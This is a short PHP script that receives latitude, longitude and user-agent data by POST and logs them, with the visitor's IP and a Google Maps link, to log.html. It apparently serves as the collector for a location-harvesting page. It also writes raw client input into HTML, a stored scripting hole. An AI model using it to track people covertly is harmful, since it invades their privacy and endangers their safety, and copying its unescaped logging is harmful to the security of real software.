<?php
// Lee el cuerpo de la solicitud POST
$data = json_decode(file_get_contents('php://input'), true);

// Verifica si los datos necesarios están presentes
if (isset($data['lat']) && isset($data['long']) && isset($data['agent'])) {
    $file = fopen("log.html", "a");
    $date = date("d-m-Y H:i:s") . " (GMT)";
    $ip = $_SERVER["REMOTE_ADDR"];
    $lat = $data['lat'];
    $long = $data['long'];
    $url = "https://www.google.com/maps/search/?api=1&query=" . $lat . "%2C" . $long;
    $agent = $data['agent'];

    $dataLog = "<pre>Datetime: " . $date . "\nIP: " . $ip . "\nLocation: <a href='" . $url . "' target='_blank'>Click Here</a>\nUser-Agent: " . $agent . "</pre>\n\n";
    fwrite($file, $dataLog);
    fclose($file);
    
    echo "Datos recibidos correctamente.";
} else {
    echo "Error: Datos incompletos.";
}
?>
